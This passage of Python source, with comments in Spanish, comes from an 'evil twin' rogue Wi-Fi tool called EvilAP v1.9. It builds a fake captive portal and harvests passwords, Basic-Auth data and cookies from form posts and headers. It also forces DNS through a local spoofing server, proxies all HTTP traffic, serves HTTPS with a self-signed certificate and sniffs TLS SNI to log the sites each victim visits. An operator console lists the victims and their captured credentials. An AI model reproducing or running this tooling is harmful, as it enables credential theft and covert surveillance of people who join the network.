                    u, p = dec.split(":",1)
                    save_creds(ip, host, path, {"user":u,"pass":p}, "HTTP-BASIC-AUTH")
            except: pass
        ck = self._hget("Cookie")
        if ck:
            creds = {}
            for part in ck.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=",1)
                    if CRED_RE.search(k.strip()) and v.strip():
                        creds[f"cookie_{k.strip()}"] = v.strip()
            if creds: save_creds(ip, host, path, creds, "HTTP-COOKIE")

    def _redirect_portal(self):
        loc  = _portal_url()
        body = f'<html><body><a href="{loc}">Portal</a></body></html>'.encode()
        self.send_response(302)
        self.send_header("Location", loc)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control","no-cache,no-store")
        self.end_headers()
        self.wfile.write(body)

    def _forward_to(self, method, body, target_host, target_port, path=None, orig_host=None):
        """
        Forward al servidor indicado (host:port).
        FIX v1.9: acepta target_host/port explÃ­cito para USER_SRV.
        Preserva el Host header original para que el servidor externo sepa
        a quÃ© dominio iba el request.
        """
        use_path = path if path is not None else self.path
        use_host = orig_host if orig_host else target_host
        try:
            conn = _hc.HTTPConnection(target_host, target_port, timeout=10)
            fwd  = {k:v for k,v in self.headers.items()
                    if k.lower() not in ("connection","keep-alive","proxy-connection",
                                         "transfer-encoding","upgrade")}
            fwd["Host"]            = use_host   # host original del cliente
            fwd["X-Forwarded-For"] = self.client_address[0]
            fwd["X-Real-IP"]       = self.client_address[0]
            conn.request(method, use_path, body=body or None, headers=fwd)
            resp      = conn.getresponse()
            resp_body = resp.read()
            resp_hdrs = [(k,v) for k,v in resp.getheaders()
                         if k.lower() not in ("transfer-encoding","connection","keep-alive")]
            conn.close()
            self.send_response(resp.status)
            for k, v in resp_hdrs: self.send_header(k, v)
            self.end_headers()
            self.wfile.write(resp_body)
            return resp.status
        except Exception as e:
            try:
                msg = f"<html><body><h2>Error de conexion</h2><p>{e}</p></body></html>".encode()
                self.send_response(502)
                self.send_header("Content-Type","text/html")
                self.send_header("Content-Length",str(len(msg)))
                self.end_headers()
                self.wfile.write(msg)
            except: pass
            return 502

    def _forward_real(self, method, body):
        """Forward al destino real (para clientes authed sin USER_SRV)."""
        host_hdr  = self._hget("Host") or GW_IP
        real_host = host_hdr.split(":")[0]
        parts     = host_hdr.split(":")
        port      = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 80
        return self._forward_to(method, body, real_host, port, orig_host=host_hdr)

    def _forward_user_srv(self, method, body):
        """
        FIX v1.9: Forward al servidor externo del usuario (Flask/Nginx).
        USER_SRV = "host:port" (ej: "10.0.0.1:5000" o "127.0.0.1:8080")
        El path, headers y body llegan intactos al servidor externo.
        El servidor externo ve el Host original del cliente en el header Host.
        """
        srv   = USER_SRV  # "host:port"
        parts = srv.rsplit(":", 1)
        t_host = parts[0]
        t_port = int(parts[1]) if len(parts) > 1 else 80
        orig_host = self._hget("Host") or GW_IP
        return self._forward_to(method, body, t_host, t_port, orig_host=orig_host)

    def _serve_portal_integrated(self, ip, method, host, path, body):
        """Sirve el portal HTML integrado."""
        if method == "POST" and path in ("/login","/portal"):
            try:
                creds = _parse_creds(body.decode("utf-8","replace"))
                if creds: save_creds(ip, host, path, creds, "HTTP-POST-PORTAL")
            except: pass
            with _lk_clients:
                _init_client(ip); clients[ip]["authed"] = True
            net_allow(ip)
            cid = _ip_to_id.get(ip,"?")
            print(f"\n  {G}[AUTH]{X} {C}#{cid}{X} {W}{ip}{X} -> {G}internet ON{X}\n")
            html = PORTAL_SUCCESS_HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type","text/html; charset=utf-8")
            self.send_header("Content-Length",str(len(html)))
            self.end_headers()
            self.wfile.write(html)
            return 200
        html = PORTAL_HTML.encode()
        self.send_response(200)
        self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",str(len(html)))
        self.send_header("Cache-Control","no-cache")
        self.end_headers()
        self.wfile.write(html)
        return 200

    def _handle(self, method):
        ip   = self._ip()
        host = (self._hget("Host") or GW_IP).split(":")[0]
        path = self._path_clean()
        body = self._read_body() if method in ("POST","PUT","PATCH") else b""

        # ââ Probe paths (detecciÃ³n captive portal por OS) ââââââââââââââââ
        if path in _PROBE_PATHS:
            if self._authed(ip):
                # Cliente con 'allow': darle respuesta correcta siempre
                # Si estÃ¡ authed no debe quedar atascado en connectivity checks
                code, ctype, rbody = _PROBE_OK[path]
                self.send_response(code)
                if ctype:  self.send_header("Content-Type", ctype)
                if rbody:  self.send_header("Content-Length", str(len(rbody)))
                self.send_header("Cache-Control","no-cache,no-store")
                self.end_headers()
                if rbody: self.wfile.write(rbody)
                self._record(ip, method, host, path, code)
            elif PORTAL_MODE == "popup":
                # No authed + popup: redirigir al portal para mostrar el popup
                self._redirect_portal()
                self._record(ip, method, host, path, 302)
            else:
                # No authed + dns: respuesta correcta, el proxy intercepta
                code, ctype, rbody = _PROBE_OK[path]
                self.send_response(code)
                if ctype:  self.send_header("Content-Type", ctype)
                if rbody:  self.send_header("Content-Length", str(len(rbody)))
                self.send_header("Cache-Control","no-cache,no-store")
                self.end_headers()
                if rbody: self.wfile.write(rbody)
                self._record(ip, method, host, path, code)
            return

        # ââ Requests al portal/gateway propio âââââââââââââââââââââââââââ
        is_portal = (host == GW_IP or (PORTAL_DOMAIN and host == PORTAL_DOMAIN))
        if is_portal:
            if USER_SRV:
                # FIX v1.9: forward al servidor externo del usuario
                # El servidor Flask/Nginx recibe el request completo
                self._capture_creds(ip, host, path, body, method)
                status = self._forward_user_srv(method, body)
                # Si el servidor externo responde con login exitoso (POST /login)
                # marcamos al cliente como authed
                if method == "POST" and path in ("/login","/portal") and status in (200,201,302):
                    with _lk_clients:
                        _init_client(ip); clients[ip]["authed"] = True
                    net_allow(ip)
                    cid = _ip_to_id.get(ip,"?")
                    print(f"\n  {G}[AUTH]{X} {C}#{cid}{X} {W}{ip}{X} -> {G}internet ON{X}\n")
            else:
                status = self._serve_portal_integrated(ip, method, host, path, body)
            self._record(ip, method, host, path, status)
            return

        # ââ Cliente no autenticado âââââââââââââââââââââââââââââââââââââââ
        if not self._authed(ip):
            self._redirect_portal()
            self._record(ip, method, host, path, 302)
            return

        # ââ Cliente autenticado ââââââââââââââââââââââââââââââââââââââââââ
        self._capture_creds(ip, host, path, body, method)
        if USER_SRV:
            # FIX v1.9: con servidor externo, TODO el trÃ¡fico va a USER_SRV
            # Esto permite que Flask/Nginx intercepte TODA la navegaciÃ³n post-auth
            status = self._forward_user_srv(method, body)
        else:
            # Sin servidor externo: forward al internet real
            status = self._forward_real(method, body)
        self._record(ip, method, host, path, status)

    def do_GET(self):     self._handle("GET")
    def do_POST(self):    self._handle("POST")
    def do_PUT(self):     self._handle("PUT")
    def do_DELETE(self):  self._handle("DELETE")
    def do_HEAD(self):    self._handle("HEAD")
    def do_OPTIONS(self): self._handle("OPTIONS")
    def do_PATCH(self):   self._handle("PATCH")
    def log_message(self, *a): pass

def start_transparent_proxy(gw):
    global _proxy_server
    try:
        _proxy_server = HTTPServer((gw, PROXY_PORT), TransparentProxyHandler)
        _proxy_server.timeout = 30
        threading.Thread(target=_proxy_server.serve_forever, daemon=True).start()
        print(f"{G}[+]{X} Proxy transparente {W}{gw}:{PROXY_PORT}{X}  {DM}(intercepta TODO HTTP){X}")
    except OSError as e:
        print(f"{R}[!] Proxy :{PROXY_PORT} fallo: {e}{X}")
        print(f"{Y}    ss -tlnp | grep {PROXY_PORT}{X}"); sys.exit(1)

# =============================================================================
#  HTTPS (:443) -- cert autofirmado, redirige al portal
# =============================================================================
def _cert_paths():
    if SSL_CERT_CUSTOM and SSL_KEY_CUSTOM:
        return Path(SSL_CERT_CUSTOM), Path(SSL_KEY_CUSTOM)
    return SSL_CERT, SSL_KEY

def generate_self_signed_cert():
    if SSL_CERT_CUSTOM and SSL_KEY_CUSTOM:
        cp, kp = Path(SSL_CERT_CUSTOM), Path(SSL_KEY_CUSTOM)
        if cp.exists() and kp.exists():
            print(f"{G}[+]{X} Cert personalizado: {W}{cp.name}{X}"); return
    if SSL_CERT.exists() and SSL_KEY.exists(): return
    print(f"{Y}[*]{X} Generando certificado SSL autofirmado...")
    cn = _portal_host()
    rc, _, _ = run(
        f"openssl req -x509 -newkey rsa:2048 -nodes "
        f"-keyout {SSL_KEY} -out {SSL_CERT} -days 365 "
        f"-subj '/CN={cn}/O=WiFi/C=US' "
        f"-addext 'subjectAltName=IP:{GW_IP},DNS:{cn}' 2>/dev/null", silent=True)
    if rc == 0: print(f"{G}[+]{X} Cert SSL autofirmado generado")
    else:       print(f"{Y}[!]{X} openssl fallo, HTTPS no disponible")

def start_portal_https(gw):
    global _portal_server_https
    cert_path, key_path = _cert_paths()
    if not cert_path.exists() or not key_path.exists():
        print(f"{Y}[!]{X} Sin cert SSL, HTTPS omitido"); return
    try:
        _portal_server_https = HTTPServer((gw, 443), TransparentProxyHandler)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=str(cert_path), keyfile=str(key_path))
        _portal_server_https.socket = ctx.wrap_socket(_portal_server_https.socket, server_side=True)
        threading.Thread(target=_portal_server_https.serve_forever, daemon=True).start()
        tipo = "personalizado" if SSL_CERT_CUSTOM else "autofirmado"
        print(f"{G}[+]{X} HTTPS {W}https://{gw}:443/{X}  {DM}(cert {tipo}){X}")
    except Exception as e:
        print(f"{R}[!]{X} HTTPS fallo: {e}")

# =============================================================================
#  SYSTEMD-RESOLVED + NetworkManager -- libera puerto 53
#
#  FIX v1.9: tambiÃ©n para NetworkManager que tiene su propio dnsmasq interno
# =============================================================================
def fix_dns_port():
    global _resolved_was_active
    _, out, _ = run("ss -tulnp 2>/dev/null | grep ':53 '", silent=True)

    if "systemd-resolve" in out or "resolved" in out:
        print(f"{Y}[*]{X} Deteniendo systemd-resolved...")
        rc, _, _ = run("systemctl stop systemd-resolved", silent=True)
        if rc == 0:
            _resolved_was_active = True
            # Reescribir resolv.conf para no quedar sin DNS en el host
            resolv = Path("/etc/resolv.conf")
            if resolv.is_symlink(): resolv.unlink()
            resolv.write_text("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")
            print(f"{G}[+]{X} systemd-resolved detenido, resolv.conf reescrito")

    # FIX v1.9: NetworkManager tambiÃ©n puede tener dnsmasq en :53
    _, nm_out, _ = run("ss -tulnp 2>/dev/null | grep ':53'", silent=True)
    if "NetworkManager" in nm_out or "dnsmasq" in nm_out:
        print(f"{Y}[*]{X} Deteniendo NetworkManager (tiene dnsmasq en :53)...")
        run("systemctl stop NetworkManager", silent=True)
        time.sleep(0.5)

    # Matar cualquier dnsmasq restante
    run("pkill -9 dnsmasq 2>/dev/null", silent=True)
    time.sleep(0.5)

    # Verificar que :53 estÃ© libre
    _, chk, _ = run("ss -ulnp | grep ':53'", silent=True)
    if chk.strip():
        print(f"{R}[!]{X} Puerto 53 todavÃ­a ocupado:")
        print(f"    {chk}")
        print(f"{Y}    Prueba: fuser -k 53/udp 53/tcp{X}")
    else:
        print(f"{G}[+]{X} Puerto 53 libre")

def restore_dns_port():
    if _resolved_was_active:
        run("systemctl start systemd-resolved", silent=True)
        print(f"{G}[+]{X} systemd-resolved restaurado")
    run("systemctl start NetworkManager 2>/dev/null", silent=True)

# =============================================================================
#  RED / IPTABLES
#
#  FIX v1.9: net_allow() ya NO redirige DNS a 8.8.8.8
#  -- el DNS siempre pasa por dnsmasq local (que es tuyo, con tus reglas)
#  -- el cliente authed tiene FORWARD abierto y el proxy sigue interceptando HTTP
# =============================================================================
def backup_iptables():
    rc, out, _ = run("iptables-save", silent=True)
    if rc == 0 and out:
        IPTABLES_BAK.write_text(out)
        print(f"{G}[+]{X} iptables backup OK")

def restore_iptables():
    if IPTABLES_BAK.exists() and IPTABLES_BAK.stat().st_size > 0:
        run(f"iptables-restore < {IPTABLES_BAK}", silent=True)
        print(f"{G}[+]{X} iptables restaurado")
    else:
        for tbl in ["nat","mangle","filter"]:
            run(f"iptables -t {tbl} -F", silent=True)
            run(f"iptables -t {tbl} -X", silent=True)
            for ch in ["INPUT","FORWARD","OUTPUT"]:
                run(f"iptables -t {tbl} -P {ch} ACCEPT", silent=True)
        print(f"{G}[+]{X} iptables limpiado")

def setup_network(iface, ap_cfg, nat_cfg, ap_mac=None):
    global GW_IP, NAT_IFACE
    gw = ap_cfg["gateway"]
    GW_IP     = gw
    NAT_IFACE = nat_cfg["iface"] if nat_cfg["enabled"] else None

    print(f"\n{Y}[*]{X} Configurando {W}{iface}{X} -> {gw}/24")
    run(f"ip link set {iface} down", silent=True)
    run(f"ip addr flush dev {iface}", silent=True)
    if ap_mac:
        af  = Path(f"/sys/class/net/{iface}/address")
        cur = af.read_text().strip() if af.exists() else ""
        if ap_mac.lower() != cur.lower():
            rc, _, _ = run(f"ip link set dev {iface} address {ap_mac}")
            if rc == 0: print(f"  {G}[+]{X} MAC -> {W}{ap_mac}{X}")
    run(f"ip link set {iface} up")
    run(f"ip addr add {gw}/24 dev {iface}")
    run("sysctl -w net.ipv4.ip_forward=1 >/dev/null")
    backup_iptables()
    for tbl in ["nat","mangle"]:
        run(f"iptables -t {tbl} -F", silent=True)
        run(f"iptables -t {tbl} -X", silent=True)
    run("iptables -F FORWARD", silent=True)
    run("iptables -F INPUT",   silent=True)
    run("iptables -F OUTPUT",  silent=True)

    run("iptables -t nat -N EVILAP 2>/dev/null", silent=True)
    run("iptables -t nat -F EVILAP")
    run(f"iptables -t nat -A PREROUTING -i {iface} -j EVILAP")

    # DNS siempre a dnsmasq local (FIX: NO hay RETURN para clientes authed)
    run(f"iptables -t nat -A EVILAP -p udp --dport 53 -j DNAT --to {gw}:53")
    run(f"iptables -t nat -A EVILAP -p tcp --dport 53 -j DNAT --to {gw}:53")
    print(f"{G}[+]{X} DNS :53 -> {W}{gw}:53{X}  {DM}(forzado, sin escape){X}")

    # HTTP siempre al proxy (captura todo, pre y post auth)
    run(f"iptables -t nat -A EVILAP -p tcp --dport 80 -j DNAT --to {gw}:{PROXY_PORT}")
    print(f"{G}[+]{X} HTTP :80 -> {W}{gw}:{PROXY_PORT}{X}  {DM}(proxy transparente){X}")

    # HTTPS al handler SSL
    run(f"iptables -t nat -A EVILAP -p tcp --dport 443 -j DNAT --to {gw}:443")
    print(f"{G}[+]{X} HTTPS :443 -> {W}{gw}:443{X}")

    run("iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT")
    run(f"iptables -A FORWARD -i {iface} -j DROP")
    run(f"iptables -A INPUT -i {iface} -j ACCEPT", silent=True)

    if nat_cfg["enabled"]:
        up = nat_cfg["iface"]
        run(f"iptables -t nat -A POSTROUTING -o {up} -j MASQUERADE")
        print(f"{G}[+]{X} NAT via {W}{up}{X} {Y}(inactivo hasta 'allow'){X}")
    else:
        print(f"{Y}[*]{X} AP aislado (sin NAT)")

def net_allow(client_ip):
    """
    FIX v1.9: DNS ya NO va a 8.8.8.8.
    Solo abrimos FORWARD para que el cliente pueda llegar al proxy
    y el proxy pueda hacer forward al internet real (o a USER_SRV).
    DNS sigue siendo el tuyo (dnsmasq local con tus reglas de spoof).
    """
    iface = AP_IFACE
    # FIX: eliminado DNAT a 8.8.8.8 -- DNS siempre queda en dnsmasq local
    # Solo abrir HTTPS y FORWARD para el cliente authed
    run(f"iptables -t nat -I EVILAP 1 -s {client_ip} -p tcp --dport 443 -j RETURN")
    run(f"iptables -I FORWARD 1 -i {iface} -s {client_ip} -j ACCEPT")
    run(f"iptables -I FORWARD 1 -o {iface} -d {client_ip} -j ACCEPT")

def net_revoke(client_ip):
    iface = AP_IFACE
    run(f"iptables -t nat -D EVILAP -s {client_ip} -p tcp --dport 443 -j RETURN 2>/dev/null", silent=True)
    run(f"iptables -D FORWARD -i {iface} -s {client_ip} -j ACCEPT 2>/dev/null", silent=True)
    run(f"iptables -D FORWARD -o {iface} -d {client_ip} -j ACCEPT 2>/dev/null", silent=True)

def net_kick(client_ip):
    run(f"iptables -I INPUT   1 -s {client_ip} -j DROP", silent=True)
    run(f"iptables -I FORWARD 1 -s {client_ip} -j DROP", silent=True)
    run(f"iptables -I FORWARD 1 -d {client_ip} -j DROP", silent=True)

def net_unblock(client_ip):
    run(f"iptables -D INPUT   -s {client_ip} -j DROP 2>/dev/null", silent=True)
    run(f"iptables -D FORWARD -s {client_ip} -j DROP 2>/dev/null", silent=True)
    run(f"iptables -D FORWARD -d {client_ip} -j DROP 2>/dev/null", silent=True)

def teardown_network():
    print(f"\n{Y}[*]{X} Limpiando red...")
    restore_iptables()
    run("sysctl -w net.ipv4.ip_forward=0 >/dev/null", silent=True)
    if AP_IFACE:
        run(f"ip addr flush dev {AP_IFACE}", silent=True)
        run(f"ip link set {AP_IFACE} down", silent=True)

# =============================================================================
#  CREDENCIALES
# =============================================================================
def _parse_creds(body):
    if not body: return {}
    found = {}
    try:
        for k, vs in parse_qs(body, keep_blank_values=False).items():
            if CRED_RE.search(k): found[k] = unquote_plus(vs[0])
    except: pass
    if not found:
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                for k,v in obj.items():
                    if CRED_RE.search(str(k)) and v: found[k] = str(v)
        except: pass
    if not found:
        for m in re.finditer(r'([a-zA-Z_\-]{2,30})\s*[=:]\s*([^\s&"\'<>{};,]{1,200})', body):
            k, v = m.group(1), m.group(2)
            if CRED_RE.search(k) and v: found[k] = v
    return found

def save_creds(client_ip, host, path, creds, proto):
    if not creds: return
    entry = {"time":ts_iso(),"client":client_ip,"proto":proto,"host":host,"path":path,"creds":creds}
    with _lk_creds:
        all_creds.append(entry)
        with _lk_clients:
            _init_client(client_ip)
            clients[client_ip]["creds"].append(entry)
        with open(CREDS_LOG,"a") as f:
            f.write(f"\n{'='*60}\n  TIME : {entry['time']}\n"
                    f"  IP   : {client_ip}  [{proto}]\n  URL  : {host}{path}\n")
            for k,v in creds.items(): f.write(f"  {k.upper():<16}: {v}\n")
        with open(CREDS_JSON,"w") as f: json.dump(all_creds,f,indent=2)
    bar = f"{R}{BD}{'!'*60}{X}"
    print(f"\n{bar}")
    print(f"  {R}{BD}[ CREDS ]{X}  {W}{ts()}{X}  {Y}{proto}{X}  {C}{client_ip}{X}")
    print(f"  {DM}URL:{X} {W}{host}{path}{X}")
    for k,v in creds.items():
        isp = bool(re.search(r'pass|pwd|secret|pin|token|hash',k,re.I))
        print(f"  {C}{k.upper():<16}{X}: " + (f"{R}{BD}{v}{X}" if isp else f"{G}{v}{X}"))
    print(f"{bar}\n")

# =============================================================================
#  SNI SNIFFER
# =============================================================================
def start_sniffer(iface):
    if not shutil.which("tcpdump"):
        print(f"{Y}[!]{X} tcpdump no encontrado, SNI sniffer desactivado"); return
    def _run():
        global proc_tcpdump
        cmd = f"tcpdump -i {iface} -l -n -s 0 -A 'tcp port 443' 2>/dev/null"
        proc_tcpdump = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                         stderr=subprocess.DEVNULL, text=True, bufsize=1)
        flow = {"src":"","buf":[]}
        for raw in proc_tcpdump.stdout:
            line = raw.rstrip()
            hdr  = re.match(r'IP\s+([\d.]+)\.\d+\s+>\s+[\d.]+\.443', line)
            if hdr:
                if flow["buf"] and flow["src"]: _check_sni(flow["src"], "\n".join(flow["buf"]))
                flow = {"src":hdr.group(1),"buf":[]}
                continue
            if flow["src"]:
                flow["buf"].append(line)
                if len(flow["buf"]) >= 40:
                    _check_sni(flow["src"], "\n".join(flow["buf"]))
                    flow["buf"] = []
    threading.Thread(target=_run, daemon=True).start()
    print(f"{G}[+]{X} SNI sniffer en {W}{iface}{X}")

def _check_sni(src, content):
    sni = ""
    for m in re.finditer(r'([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,}){1,4})', content):
        s = m.group(0)
        if (len(s)>6 and "." in s and not re.match(r'^\d',s)
                and not any(x in s.lower() for x in ["tcpdump","gnu","libc","ubuntu","debian"])):
            sni = s; break
    if sni and not any(n in sni for n in _NOISY):
        with _lk_clients:
            _init_client(src)
            if sni not in clients[src]["https"]:
                clients[src]["https"].append(sni)
            clients[src]["last_seen_ts"] = time.time()
            clients[src]["browsing"]     = sni
        line = f"  {C}[TLS]{X} {Y}{src:<15}{X} -> {W}{sni}{X}"
        print(line)
        _watch_notify(src, line)

# =============================================================================
#  DNS/DHCP LOG READER
# =============================================================================
def start_dns_reader():
    def _run():
        seen = 0
        if DNSMASQ_LOG.exists():
            seen = len(DNSMASQ_LOG.read_text(errors="replace").splitlines())
        while True:
            try:
                if DNSMASQ_LOG.exists():
                    lines = DNSMASQ_LOG.read_text(errors="replace").splitlines()
                    for line in lines[seen:]:
                        m = _RE_DNS.search(line)
                        if m:
                            t_, qt, dom, cli = m.group(1), m.group(2), m.group(3), m.group(4)
                            with _lk_clients:
                                _init_client(cli)
                                if dom not in clients[cli]["dns"]:
                                    clients[cli]["dns"].append(dom)
                                clients[cli]["last_seen_ts"] = time.time()
                            if not any(n in dom for n in _NOISY):
                                print(f"  {DM}{t_}{X}  {Y}{cli:<15}{X}  {C}{qt:<6}{X}  {W}{dom}{X}")
                            continue
                        m = _RE_DHCP.search(line)
                        if m:
                            op = m.group(2); ip = m.group(3); mac = m.group(4)
                            host = (m.group(5) or "").strip().strip('"\'')
                            if op == "ACK":
                                with _lk_clients:
                                    _init_client(ip)
                                    if mac:  clients[ip]["mac"]      = mac
                                    if host and host != "*": clients[ip]["hostname"] = host
                                    clients[ip]["last_seen_ts"] = time.time()
                                _parse_leases()
                                cid  = _ip_to_id.get(ip, "?")
                                disp = host or clients.get(ip,{}).get("hostname","")
                                print(f"\n  {G}[+]{X} {C}#{cid}{X}  {W}{BD}{ip}{X}  "
                                      f"{DM}{mac}{X}  {Y}{disp or '(sin hostname)'}{X}  "
                                      f"{R}internet=OFF{X}\n")
                    seen = len(lines)
            except: pass
            time.sleep(0.4)
    threading.Thread(target=_run, daemon=True).start()

# =============================================================================
#  INICIO DE SERVICIOS
# =============================================================================
def start_hostapd():
    global proc_hostapd
    print(f"{Y}[*]{X} Iniciando hostapd...")
    proc_hostapd = subprocess.Popen(["hostapd", str(HOSTAPD_CONF)],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2.5)
    if proc_hostapd.poll() is not None:
        p2 = subprocess.run(["hostapd","-d",str(HOSTAPD_CONF)],
                             capture_output=True, text=True, timeout=3)
        print(f"{R}[!] hostapd fallo:{X}\n{p2.stderr[-500:]}"); sys.exit(1)
    print(f"{G}[+]{X} hostapd PID={proc_hostapd.pid}")

def start_dnsmasq():
    global proc_dnsmasq
    print(f"{Y}[*]{X} Iniciando dnsmasq...")
    run("pkill -9 dnsmasq 2>/dev/null", silent=True)
    time.sleep(0.8)
    proc_dnsmasq = subprocess.Popen(
        ["dnsmasq","-C",str(DNSMASQ_CONF),"--no-daemon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
    )
    time.sleep(1.2)
    if proc_dnsmasq.poll() is not None:
        err = proc_dnsmasq.stderr.read().decode(errors="replace")
        print(f"{R}[!] dnsmasq fallo:{X}\n{err[-400:]}")
        print(f"{Y}    Verifica: ss -ulnp | grep :53{X}"); sys.exit(1)
    print(f"{G}[+]{X} dnsmasq PID={proc_dnsmasq.pid}")
    # Test rÃ¡pido de DNS
    time.sleep(0.3)
    _, out, _ = run(f"dig +short +time=2 @{GW_IP} test.example.com 2>/dev/null", silent=True)
    if out.strip():
        print(f"  {G}[â]{X} DNS spoof activo: test.example.com -> {C}{out.strip()}{X}")
    else:
        print(f"  {Y}[?]{X} DNS test sin respuesta. Comprueba con: dig @{GW_IP} google.com")

# =============================================================================
#  CONSOLA INTERACTIVA
# =============================================================================
HELP_TEXT = f"""
{C}{'â'*64}{X}
  {BD}EvilAP v1.9  --  Comandos{X}
  {DM}Acepta ID (#1, 1) o IP completa{X}
{C}{'â'*64}{X}
  {G}clients{X}                      listar clientes
  {G}status{X}                       estado general
  {G}info   <id|ip>{X}               perfil completo
  {G}watch  <id|ip>{X}               trÃ¡fico en VIVO
  {G}allow  <id|ip> [id|ip...]{X}   dar internet
  {G}revoke <id|ip> [id|ip...]{X}   quitar internet
  {G}kick   <id|ip>{X}              bloquear
  {G}unblock <id|ip>{X}             desbloquear
  {G}traffic <id|ip>{X}             historial de trÃ¡fico
  {G}creds  [id|ip]{X}              credenciales capturadas
  {G}dns add <dom> <ip>{X}          agregar spoof
  {G}dns del <dom>{X}               eliminar spoof
  {G}dns list{X}                    listar spoofs
  {G}dns flush{X}                   borrar todos
  {G}mode popup|dns{X}              cambiar modo portal
  {G}ipt{X}                         ver iptables
  {G}save{X}                        guardar a disco
  {G}clear{X}                       limpiar pantalla
  {G}exit{X}                        apagar y restaurar
{C}{'â'*64}{X}
"""

_CONSOLE_STYLE = Style.from_dict({"prompt":"#e94560 bold","arrow":"#666666"})

def _do_save():
    try:
        with _lk_clients: d = dict(clients)
        with open(TRAFFIC_JSON,"w") as f: json.dump(d,f,indent=2,default=str)
        with _lk_creds: c = list(all_creds)
        with open(CREDS_JSON,"w") as f: json.dump(c,f,indent=2)
        with _lk_dns: r = dict(dns_spoof)
        with open(TMP/"dns_rules.json","w") as f: json.dump(r,f,indent=2)
        print(f"  {G}[+]{X} Guardado en {W}{_EXEC_DIR}/{X}")
    except Exception as e:
        print(f"  {R}[!] Error: {e}{X}")

def run_console(ap_cfg, nat_cfg, dns_cfg):
    global PORTAL_MODE
    completer = NestedCompleter.from_nested_dict({
        "allow":None,"revoke":None,"kick":None,"unblock":None,
        "traffic":None,"creds":None,"info":None,"watch":None,
        "dns":{"add":None,"del":None,"list":None,"flush":None},
        "mode":{"popup":None,"dns":None},
        "clients":None,"status":None,"ipt":None,"save":None,
        "clear":None,"help":None,"exit":None,
    })
    session = PromptSession(completer=completer, history=InMemoryHistory(),
                            style=_CONSOLE_STYLE, complete_while_typing=False)

    mc = G if PORTAL_MODE=='dns' else Y
    srv_info = f"-> {USER_SRV}" if USER_SRV else "integrado"
    print(f"\n{C}{'='*64}{X}")
    print(f"  {G}{BD}EvilAP v1.9 ACTIVO{X}  |  {W}help{X} para comandos")
    print(f"  Modo: {mc}{PORTAL_MODE.upper()}{X}  |  Portal: {W}{srv_info}{X}")
    print(f"  {Y}DNS: SIEMPRE local (nunca 8.8.8.8 para clientes){X}")
    print(f"  {Y}Internet OFF para todos. 'allow <ip>' para dar acceso.{X}")
    print(f"{C}{'='*64}{X}\n")

    while True:
        try:
            raw = session.prompt(HTML('<prompt>EvilAP</prompt><arrow> >> </arrow>')).strip()
        except EOFError:
            cleanup()
        except KeyboardInterrupt:
            print(f"\n  {Y}[!] Usa 'exit' para salir{X}")
            continue
        if not raw: continue
        parts = raw.split(); cmd = parts[0].lower(); args = parts[1:]

        if cmd in ("exit","quit","q"):
            cleanup()

        elif cmd == "help":
            print(HELP_TEXT)

        elif cmd == "mode":
            if not args or args[0] not in ("popup","dns"):
                print(f"  {Y}mode popup|dns{X}"); continue
            PORTAL_MODE = args[0]
            mc2 = G if PORTAL_MODE=='dns' else Y
            print(f"  {mc2}[*]{X} Modo -> {W}{PORTAL_MODE.upper()}{X}")

        elif cmd == "clients":
            with _lk_clients: snap = dict(clients)
            if not snap:
                print(f"\n  {Y}Sin clientes{X}\n"); continue
            print(f"\n{W}  {'#':<4} {'IP':<16} {'HOSTNAME':<20} {'MAC':<19} {'ESTADO':<8} "
                  f"{'ACTIVO':<7} {'CONECTADO':<10} {'VISTO':<9} {'CR':>3}  NAVEGANDO{X}")
            print("  " + "â"*116)
            for ip, info in snap.items():
                cid     = _ip_to_id.get(ip, "?")
                activo  = _is_active(info)
                st_col  = G if info["authed"] else Y
                st_lbl  = "AUTH" if info["authed"] else "PORTAL"
                act_lbl = f"{G}SI{X}" if activo else f"{R}NO{X}"
                host    = info.get("hostname") or f"{DM}-{X}"
                mac     = info.get("mac")       or f"{DM}?{X}"
                cr      = len(info["creds"])
                crc     = f"{R}{BD}{cr}{X}" if cr else f"{DM}{cr}{X}"
                browsing = info.get("browsing","")
                brow_str = (f"{G}{browsing[:28]}{X}" if browsing and not any(n in browsing for n in _NOISY)
                            else f"{DM}{browsing[:28] or '-'}{X}")
                print(f"  {C}{cid:<4}{X}{W}{ip:<16}{X}{Y}{host:<20}{X}{DM}{mac:<19}{X}"
                      f"{st_col}{st_lbl:<8}{X}{act_lbl:<7}  "
                      f"{DM}{_since(info['connected_ts']):<10}{X}"
                      f"{DM}{_since(info['last_seen_ts']):<9}{X}"
                      f"{crc:>3}  {brow_str}")
            print()

        elif cmd == "watch":
            if not args: print(f"  {Y}watch <id|ip>{X}"); continue
            ip = _resolve(args[0])
            if not ip: print(f"  {R}[!] No encontrado: {args[0]}{X}"); continue
            print(f"\n  {C}[ WATCH: {ip} ]  Ctrl+C para volver{X}\n")
            lines_buf = []
            def _on_line(l): lines_buf.append(l)
            _watch_subscribe(ip, _on_line)
            old_sig = signal.getsignal(signal.SIGINT)
            stop_ev = threading.Event()
            def _stop(s, f): stop_ev.set()
            signal.signal(signal.SIGINT, _stop)
            try:
                while not stop_ev.is_set():
                    while lines_buf: print(lines_buf.pop(0))
                    time.sleep(0.15)
            finally:
                signal.signal(signal.SIGINT, old_sig)
                _watch_unsubscribe(ip, _on_line)
                print(f"\n  {Y}Watch detenido{X}\n")

        elif cmd == "status":
            nat  = f"{G}{nat_cfg['iface']}{X}" if nat_cfg["enabled"] else f"{Y}AISLADO{X}"
            dlbl = {"1":f"{R}WILDCARD->{dns_cfg['spoof_ip']}{X}",
                    "2":f"{Y}CUSTOM{X}","3":f"{C}OFF{X}"}
            with _lk_clients: cnt=len(clients); aut=sum(1 for c in clients.values() if c["authed"])
